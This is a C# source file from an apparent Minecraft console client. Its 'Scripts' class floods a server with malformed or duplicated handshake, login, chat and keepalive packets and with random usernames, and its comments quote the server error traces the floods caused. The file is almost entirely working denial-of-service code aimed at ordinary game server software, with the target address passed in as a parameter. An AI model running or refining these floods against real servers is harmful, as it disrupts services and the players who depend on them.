using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MCConsoleClient
{
    class Scripts
    {
        static Random r = new Random();

        // floods the console with small errors:
        /*
         * [13:55:18 INFO]: /127.0.0.1:65042 lost connection: Internal Exception: net.minecraft.util.io.netty.handler.codec.DecoderException: java.lang.RuntimeException: An internal error occured.
         *
         */
        
        // I once had this one occur, unfortunately I forgot the packet combination:
        /*
         * [15:17:33] [Server thread/WARN]: Failed to handle packet for /127.0.0.1:5437
java.lang.IllegalStateException: Unexpected hello packet
	at net.minecraft.util.org.apache.commons.lang3.Validate.validState(Validate.java:826) ~[craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.LoginListener.a(LoginListener.java:96) ~[craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.PacketLoginInStart.a(SourceFile:33) ~[craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.PacketLoginInStart.handle(SourceFile:10) ~[craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.NetworkManager.a(NetworkManager.java:147) ~[craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.ServerConnection.c(SourceFile:134) [craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.MinecraftServer.v(MinecraftServer.java:657) [craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.DedicatedServer.v(DedicatedServer.java:250) [craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.MinecraftServer.u(MinecraftServer.java:548) [craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.MinecraftServer.run(MinecraftServer.java:459) [craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
	at net.minecraft.server.v1_7_R2.ThreadServerApplication.run(SourceFile:618) [craftbukkit.jar:git-Bukkit-1.7.2-R0.3-11-g08fad7a-b3037jnks]
         * 
         */
        public static void floodErrors(string address, int port, int count)
        {
            for (int i = 0; i < count; i++)
            {
                Program.connect(address, port);
                Packets.handshake0x00(address, port, 2);
                Packets.handshake0x00(address, port, 2);
                Packets.loginStart0x00(randomUser(10));
            }
        }


        // TODO test
        public static void floodPackets(string address, int port, int count)
        {
            Program.connect(address, port);
            for (int i = 0; i < count; i++)
            {
                if (Program.sock != null)
                {
                    if (!Program.sock.Connected)
                    {
                        Program.connect(address, port);
                    }
                }
                else
                {
                    Program.connect(address, port);
                }

                int x = r.Next(10);
                Console.Write(x);
                if (x == 1)
                {
                    Packets.handshake0x00(address, port, 1);
                }
                else if (x == 2)
                {
                    Packets.handshake0x00(address, port, 2);
                }
                else if (x == 3)
                {
                    Packets.chatMessage0x01(randomUser(30));
                }
                else if (x == 4)
                {
                    // might crash us
                    Packets.keepalive0x00();
                }
                else if (x == 5)
                {
                    Packets.loginStart0x00(randomUser(10));
                }
                else if (x == 6)
                {
                    Packets.request0x00();
                }
                else
                {
                    Packets.handshake0x00(address, port, 1);
                }
            }
        }


        // same ip, many users
        public static void floodUserLogins(string address, int port, int count)
        {
            Program.connect(address, port);
            Packets.handshake0x00(address, port, 2);
            Packets.loginStart0x00(randomUser(10));
        }



        public static string randomUser(int length)
        {
            string tempuser = "";
            string abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            for (int j = 0; j < length; j++)
            {
                tempuser += abc.Substring(r.Next(51), 1);
            }
            return tempuser;
        }
    }
}
